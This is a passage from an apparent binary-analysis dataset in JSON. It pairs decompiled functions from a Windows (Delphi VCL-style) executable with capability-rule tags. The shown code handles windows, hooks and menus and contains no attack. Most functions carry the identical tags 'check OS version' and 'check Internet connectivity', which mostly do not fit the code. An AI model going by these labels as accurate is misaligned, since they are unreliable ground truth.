        "decompiled_code": "\nuint __cdecl fcn.004447cc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00443d90();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00443d7c();\n            if ((((*(iVar2 + 0x30) == 0) && ((*(iVar2 + 0x1c) & 0x10) == 0)) && (*(iVar2 + 0x5b) != '\\0')) &&\n               ((*(iVar2 + 0x57) != '\\0' && (*(iVar2 + 0x273) != '\\x01')))) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "004448ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004448ac(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x8c) != 0) {\n        *(in_EAX + 0x8e) = *(in_EAX + 0x8e) | 0x10;\n        return;\n    }\n    puStack32 = 0x4448da;\n    var_4h = in_EAX;\n    fcn.00444408();\n    uStack36 = 0x444925;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = 0x30;\n    puStack32 = &stack0xfffffffc;\n    sub.user32.dll_SystemParametersInfoA(0x30, 0, &fcn.004448ac::var_14h, 0);\n    fcn.00444824();\n    *in_FS_OFFSET = uVar1;\n    *(var_4h + 0x8e) = *(var_4h + 0x8e) & 0xffef;\n    fcn.00444410(0x44492c);\n    return;\n}\n",
        "token_count": 306
    },
    "00444940": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444940(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (*(in_EAX + 0x84) != 0) {\n                fcn.00405584();\n                return;\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 104
    },
    "00444978": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444978(void)\n\n{\n    int32_t in_EAX;\n    \n    for (; (in_EAX != 0 && (*(in_EAX + 0x8d) == '\\0')); in_EAX = *(in_EAX + 0x30)) {\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00444998": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444998(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x497c1c != 0) {\n        uStack24 = 0x4449c9;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        fcn.00447368();\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "004449ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004449ec(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    *0x497c30 = sub.kernel32.dll_GetCurrentThreadId_1();\n    while( true ) {\n        iVar1 = sub.kernel32.dll_WaitForSingleObject();\n        if (iVar1 != 0x102) break;\n        if (*0x497c1c != 0) {\n            if (*(*0x497c1c + 0x60) != 0) {\n                sub.user32.dll_GetCursorPos();\n                iVar1 = fcn.0044ed48();\n                if (iVar1 == 0) {\n                    fcn.00447414();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00444a48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00444a48(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_CallNextHookEx(*0x497c38, arg_8h, arg_ch, arg_10h);\n    if ((-1 < arg_8h) && (*0x497c1c != 0)) {\n        fcn.00446358();\n    }\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00444a8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444a8c(void)\n\n{\n    uint uStack20;\n    code *pcStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*(*0x497c1c + 0xad) == '\\0') {\n        if (*0x497c38 == 0) {\n            uStack8 = 0x444aa9;\n            uStack8 = sub.kernel32.dll_GetCurrentThreadId_1();\n            uStack12 = 0;\n            pcStack16 = fcn.00444a48;\n            uStack20 = 3;\n            *0x497c38 = sub.user32.dll_SetWindowsHookExA();\n        }\n        if (*0x497c34 == 0) {\n            *0x497c34 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n        }\n        if (*0x497c3c == 0) {\n            *0x497c3c = sub.kernel32.dll_CreateThread_1(0, 1000, fcn.004449ec, 0, 0, &stack0xffffffec);\n        }\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "00444b00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00444b00(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x497c38 != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x497c38);\n    }\n    *0x497c38 = 0;\n    if (*0x497c3c != 0) {\n        sub.kernel32.dll_SetEvent(*0x497c34);\n        iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        if (iVar1 != *0x497c30) {\n            sub.kernel32.dll_WaitForSingleObject(*0x497c3c, 0xffffffff);\n        }\n        sub.kernel32.dll_CloseHandle_1(*0x497c3c);\n        *0x497c3c = 0;\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "00444b5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.00444b5c(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint auStack8 [2];\n    \n    auStack8[0] = 8;\n    uVar2 = 8;\n    uVar1 = sub.user32.dll_SystemParametersInfoA(0x48, 8, auStack8, 0);\n    if (uVar1 != 0) {\n        return CONCAT44(uVar2, uVar1 & 0xffffff00 | uVar2 != 0);\n    }\n    return uVar2 << 0x20;\n}\n",
        "token_count": 136
    },
    "00444cd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\ncode * __fastcall fcn.00444cd0(uint param_1, char param_2)\n\n{\n    code **ppcVar1;\n    code *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint lpFilename;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.0041ff44();\n    ppcVar1 = *0x492514;\n    if (*(*0x492514 + 2) == 0) {\n        (*0x492514)[1] = in_EAX;\n        *ppcVar1 = fcn.00446714;\n    }\n    ppcVar1 = *0x4925f4;\n    if (*(*0x4925f4 + 2) == 0) {\n        (*0x4925f4)[1] = in_EAX;\n        *ppcVar1 = fcn.00446920;\n    }\n    in_EAX[0x34] = 0x0;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x90) = uVar2;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x98) = uVar2;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0xb0) = uVar2;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 0x84) = 0;\n    *(in_EAX + 0x5c) = 0xff000018;\n    *(in_EAX + 0x78) = 500;\n    in_EAX[0x7c] = 0x1;\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x74) = 0x9c4;\n    in_EAX[0x88] = 0x0;\n    in_EAX[0xa5] = 0x1;\n    in_EAX[0xbc] = 0x1;\n    uVar2 = fcn.0042ae48();\n    *(in_EAX + 0xa0) = uVar2;\n    sub.user32.dll_LoadIconA(**0x492408, 0x444ee0);\n    fcn.0042b21c();\n    iVar3 = *(in_EAX + 0xa0);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = 0x446fe4;\n    sub.kernel32.dll_GetModuleFileNameA_1(**0x492408, &lpFilename, 0x100);\n    sub.user32.dll_OemToCharA(&lpFilename, &lpFilename);\n    iVar3 = fcn.0040ea28();\n    if (iVar3 != 0) {\n        fcn.0040a8ac();\n    }\n    puVar4 = fcn.0040ea5c();\n    if (puVar4 != NULL) {\n        *puVar4 = 0;\n    }\n    uVar2 = sub.user32.dll_CharNextA_1(&lpFilename);\n    sub.user32.dll_CharLowerA(uVar2);\n    fcn.004057a0();\n    in_EAX[0xd4] = 0x0;\n    uVar5 = 0x4463f8;\n    uVar2 = fcn.004210c0(0x4463f8, in_EAX);\n    *(in_EAX + 200) = uVar2;\n    if (**0x4922a4 == '\\0') {\n        fcn.00445024();\n    }\n    in_EAX[0x59] = 0x1;\n    in_EAX[0x5a] = 0x1;\n    in_EAX[0x5b] = 0x1;\n    in_EAX[0xa6] = 0x1;\n    *(in_EAX + 0xa8) = 0;\n    fcn.004471bc();\n    fcn.00447d20();\n    if (var_1h != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar5;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1037
    },
    "00445024": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445024(void)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint lpWndClass;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x4451c0;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((*(in_EAX + 0xac) == '\\0') && (**0x492658 == '\\0')) {\n        uVar2 = fcn.00421004(fcn.0044583c, in_EAX);\n        *(in_EAX + 0x40) = uVar2;\n        *0x490600 = sub.user32.dll_DefWindowProcA;\n        iVar3 = sub.user32.dll_GetClassInfoA(*0x4957f8, *0x490620, &fcn.00445024::lpWndClass);\n        if (iVar3 == 0) {\n            *0x49060c = *0x4957f8;\n            iVar1 = sub.user32.dll_RegisterClassA(0x4905fc);\n            if (iVar1 == 0) {\n                fcn.00407550();\n                fcn.0040daec();\n                fcn.00404ec4();\n            }\n        }\n        uVar4 = (***0x492428)(0, 0x84ca0000);\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        uVar4 = (***0x492428)(1, iVar3);\n        uVar2 = *0x4957f8;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        fcn.004059dc();\n        uVar2 = fcn.0040856c(0, uVar2, 0, 0, 0, 0, iVar3, in_stack_00000030, in_stack_00000034);\n        *(in_EAX + 0x30) = uVar2;\n        *(in_EAX + 0xac) = 1;\n        uStack20 = *(in_EAX + 0x30);\n        sub.user32.dll_SetWindowLongA();\n        if (**0x4924c8 != '\\0') {\n            fcn.00445ee4();\n            uStack8 = *(in_EAX + 0x30);\n            uStack12 = 0x445159;\n            sub.user32.dll_SendMessageA();\n            uStack12 = 0x445160;\n            uStack12 = fcn.00445ee4();\n            uStack16 = 0xfffffff2;\n            uStack20 = *(in_EAX + 0x30);\n            uStack24 = 0x44516c;\n            sub.user32.dll_SetClassLongA();\n        }\n        uStack24 = 0;\n        uStack28 = *(in_EAX + 0x30);\n        uStack32 = 0x445177;\n        uVar2 = sub.user32.dll_GetSystemMenu();\n        uStack32 = 0;\n        uStack36 = 0xf030;\n        lpWndClass = 0x445186;\n        uStack40 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        lpWndClass = 0;\n        puStack56 = 0x445193;\n        uStack64 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        if (**0x4924c8 != '\\0') {\n            puStack56 = NULL;\n            uStack60 = 0xf010;\n            uStack64 = uVar2;\n            sub.user32.dll_DeleteMenu();\n        }\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x4451c7;\n    uStack60 = 0x4451bf;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1016
    },
    "0044522c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044522c(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0xffffffff;\n    if (*0x497c1c == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = sub.user32.dll_GetWindow(arg_8h, 4);\n    if (iVar1 == *(*0x497c1c + 0x30)) {\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n        if (((uVar2 & 8) == 0) ||\n           (((*(*0x497c1c + 0x44) != 0 && (*(arg_ch + 1) == '\\0')) && (iVar1 = fcn.00458568(),  arg_8h == iVar1)))) {\n            *arg_ch = arg_8h;\n            uVar3 = 0;\n        }\n        else {\n            fcn.00419730();\n        }\n        return uVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 257
    },
    "004452a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004452a4(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iStack16 = *(in_EAX + 0x30);\n    if (iStack16 != 0) {\n        if (*(in_EAX + 0x94) == 0) {\n            pcVar4 = fcn.0044522c;\n            uStack12 = param_2;\n            sub.user32.dll_EnumWindows(fcn.0044522c, &iStack16);\n            if (*(*(in_EAX + 0x90) + 8) != 0) {\n                uVar1 = sub.user32.dll_GetWindow(pcVar4, 3);\n                uVar2 = sub.user32.dll_GetWindowLongA(uVar1, 0xffffffec, uVar1);\n                if ((uVar2 & 8) != 0) {\n                    uVar1 = 0xfffffffe;\n                }\n                iVar3 = *(*(in_EAX + 0x90) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        uVar1 = fcn.00419888(uVar1, 0, 0, 0, 0, 0x213);\n                        sub.user32.dll_SetWindowPos();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n        }\n        *(in_EAX + 0x94) = *(in_EAX + 0x94) + 1;\n    }\n    return;\n}\n",
        "token_count": 386
    },
    "00445348": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445348(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + 1;\n    if ((*(in_EAX + 0xc4) == 1) && (*(in_EAX + 0x10a) != 0)) {\n        (**(in_EAX + 0x108))();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00445374": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445374(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + -1;\n    if ((*(in_EAX + 0xc4) == 0) && (*(in_EAX + 0x112) != 0)) {\n        (**(in_EAX + 0x110))();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00445400": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445400(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (((*(in_EAX + 0x30) != 0) && (0 < *(in_EAX + 0x94))) &&\n       (*(in_EAX + 0x94) = *(in_EAX + 0x94) + -1,  *(in_EAX + 0x94) == 0)) {\n        iVar1 = *(*(in_EAX + 0x90) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.00419888(0xffffffff, 0, 0, 0, 0, 0x213);\n                sub.user32.dll_SetWindowPos();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        (**(**(in_EAX + 0x90) + 8))();\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "0044555c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044555c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    \n    if (*(*0x497c1c + 0x30) != 0) {\n        if (param_2 == '\\0') {\n            if (*(in_EAX + 0x9c) == 0) {\n                uVar2 = fcn.00447b9c();\n                pcVar4 = fcn.00445488;\n                sub.user32.dll_EnumWindows(fcn.00445488, uVar2);\n                if (*(in_EAX + 0x44) != 0) {\n                    cVar1 = fcn.0044818c();\n                    if (cVar1 != '\\0') {\n                        iVar3 = fcn.00406774();\n                        if (-1 < iVar3) {\n                            do {\n                                pcVar4 = *(*0x497c40 + iVar3 * 4);\n                                sub.user32.dll_ShowWindow();\n                                iVar3 = iVar3 + -1;\n                            } while (iVar3 != -1);\n                        }\n                    }\n                }\n                iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        pcVar4 = fcn.00419888(0, pcVar4);\n                        sub.user32.dll_ShowOwnedPopups();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n            *(in_EAX + 0x9c) = *(in_EAX + 0x9c) + 1;\n        }\n        else if ((0 < *(in_EAX + 0x9c)) && (*(in_EAX + 0x9c) = *(in_EAX + 0x9c) + -1,  *(in_EAX + 0x9c) == 0)) {\n            if (*(in_EAX + 0x44) != 0) {\n                cVar1 = fcn.0044818c();\n                if (cVar1 != '\\0') {\n                    iVar3 = fcn.00406774();\n                    if (-1 < iVar3) {\n                        do {\n                            sub.user32.dll_ShowWindow();\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != -1);\n                    }\n                }\n            }\n            iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n            if (-1 < iVar3) {\n                do {\n                    fcn.00419888(-(param_2 != '\\0'));\n                    sub.user32.dll_ShowOwnedPopups();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            (**(**(in_EAX + 0x98) + 8))();\n            fcn.00406928(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 663
    },
    "004456c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004456c0(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x4927e0 + 0xd) != '\\0') && (*(in_EAX + 0x34) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "004456d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004456d8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x4927e0 + 0xd) != '\\0') && (*(in_EAX + 0x34) == '\\x01')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "004456f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004456f0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*param_2 == *0x497c28) || (*param_2 == 0x1a)) {\n        if (*(in_EAX + 0x59) != '\\0') {\n            sub.kernel32.dll_SetThreadLocale(0x400);\n            fcn.0040ebbc();\n        }\n        if (*(in_EAX + 0x5a) != '\\0') {\n            fcn.004442b4();\n        }\n        if (*param_2 == *0x497c28) {\n            fcn.00444934();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 164
    },
    "00445748": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445748(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4457a5;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x162) != 0) {\n        fcn.00405728();\n        (**(in_EAX + 0x160))(param_2 + 0xc, 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4457ac;\n    uStack24 = 0x4457a4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 209
    },
    "00445f00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445f00(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.0043b6cc();\n    if (iVar2 != 0) {\n        return;\n    }\n    *0x497c2c = 1;\n    fcn.004453a0();\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    fcn.0044555c();\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar3 = fcn.00458568();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 != 0) {\n            cVar1 = fcn.0044818c();\n            if (cVar1 == '\\0') {\n                uVar3 = fcn.0043df2c(*(*(in_EAX + 0x44) + 0x48), 0, 0x40);\n                uVar3 = fcn.0043df0c(uVar3);\n                uVar3 = fcn.00458568(uVar3);\n                sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), uVar3);\n                sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf020, 0);\n            }\n            else {\n                fcn.0043fd24();\n            }\n            goto code_r0x00445fc4;\n        }\n    }\n    fcn.00444bb4();\ncode_r0x00445fc4:\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))();\n    }\n    return;\n}\n",
        "token_count": 444
    },
    "00445fe0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445fe0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.0043b6cc();\n    if (iVar2 == 0) {\n        return;\n    }\n    *0x497c2c = 0;\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if (*(in_EAX + 0x44) == 0) goto code_r0x004460a7;\n    cVar1 = fcn.0044818c();\n    if (cVar1 != '\\0') {\n        uVar3 = fcn.00458568(9);\n        sub.user32.dll_ShowWindow(uVar3);\n        goto code_r0x004460a7;\n    }\n    if ((*(in_EAX + 0x5b) == '\\0') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\ncode_r0x00446063:\n        fcn.00444bb4();\n    }\n    else {\n        uVar3 = fcn.00458568();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 == 0) goto code_r0x00446063;\n        sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf120, 0);\n    }\n    uVar4 = (***0x492428)(1, 0, 0, 0x40);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    uVar4 = (***0x492428)(0, iVar2);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), 0, iVar2);\ncode_r0x004460a7:\n    iVar2 = *(in_EAX + 0x44);\n    if (((iVar2 != 0) && (*(iVar2 + 0x273) == '\\x01')) && (*(iVar2 + 0x57) == '\\0')) {\n        fcn.0043fd24();\n        fcn.00442b1c();\n    }\n    fcn.00445400();\n    fcn.0044555c();\n    if (*(*0x497c20 + 100) != 0) {\n        uVar3 = fcn.00458568();\n        sub.user32.dll_SetFocus(uVar3);\n    }\n    if (*(in_EAX + 0x14a) != 0) {\n        (**(in_EAX + 0x148))();\n    }\n    return;\n}\n",
        "token_count": 666
    },
    "004461cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
